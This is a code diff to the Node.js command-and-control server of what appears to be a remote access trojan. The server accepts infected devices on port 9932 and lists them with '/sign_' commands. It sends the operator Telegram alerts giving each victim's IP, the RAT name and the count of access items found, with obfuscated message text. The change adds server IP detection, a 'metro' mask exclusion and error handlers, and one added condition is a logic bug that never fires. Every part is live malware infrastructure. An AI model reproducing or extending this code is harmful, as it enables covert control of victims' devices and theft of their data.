@@ -1,4 +1,5 @@
 const net = require("net");
+const os = require("os");
 const TelegramBot = require("node-telegram-bot-api");
 const { UserDataTransform } = require("../transform");
 
@@ -18,13 +19,29 @@ function build(string) {
     return string.split('').map(char => translationTable[char] || char).join('');
 }
 
+const networkInterfaces = os.networkInterfaces();
+let ipAddress;
+
+function getServerIP(){
+    for (const interfaceName in networkInterfaces) {
+        for (const net of networkInterfaces[interfaceName]) {
+            if (net.family === 'IPv4' && !net.internal) {
+                ipAddress = net.address;
+                break;
+            }
+        }
+        if (ipAddress){ return ipAddress; }
+    }
+}
+
 const getUsersByPort = async (portname, callback = () => {}) => {
     let found_users = [];
     for (let user of accepted_users){
         if (user.port.name == portname){
             found_users.push({
                 command: `/sign_${user.device_id}`,
-                accessory: user.access
+                accessory: user.access,
+                device_id: user.device_id
             });
         }
     }
@@ -100,7 +117,7 @@ const server = net.createServer(async (socket) => {
                         }));
                         return;
                     }
-                } else if (Object.keys(message).includes("port") && Object.keys(message).includes("password")){
+                } else if (Object.keys(message).includes("port") && Object.keys(message).includes("password") && (!Object.keys(message).includes("mask") || message.mask !== "metro")){
                     await udt.getUserByPort(message.port, message.password, async (prt) => {
                         if (prt.status){
                             accepted_users.push({
@@ -115,7 +132,7 @@ const server = net.createServer(async (socket) => {
                             let cli = new TelegramBot(prt.port.token);
                             cli.sendMessage(
                                 prt.port.chat_id,
-                                build(`🕸 | new user connected\n\n`) + `🛠 | /sign_${message.device_id}\n` + build(`\n🌐 | ip: ${message.ip} - `) + `<code>${message.ip}</code>\n` + build(`👔 | rat: ${message.rat}\n🔵 | ${message.accessory.length} access were found`),
+                                build(`🕸 𓏺|𓏺 new user connected\n\n`) + `🛠 𓏺|𓏺 <code>/sign_${message.device_id}</code>\n` + build(`\n🌐 𓏺|𓏺 ip: ${message.ip} - `) + `<code>${message.ip}</code>\n` + build(`👔 𓏺|𓏺 rat: ${message.rat}\n🔵 𓏺|𓏺 ${message.accessory.length} access were found`),
                                 {
                                     parse_mode: "HTML"
                                 }
@@ -135,9 +152,17 @@ const server = net.createServer(async (socket) => {
             message: "INVALID_DATA_TYPE"
         })) }
     })
+
+    socket.on("close", async () => {})
+    socket.on("error", async (errx) => {console.log(errx);})
+
 })
 
 server.listen(9932, "0.0.0.0", () => {
+    let getCurrentIp = getServerIP();
     console.log("[B] socket-server connected");
     console.log("[B] socket-connection -> 127.0.0.1:9932");
+    if (!getCurrentIp == "127.0.0.1"){
+        console.log(`[B] socket-connection -> ${getCurrentIp}:9932`);
+    }
 })
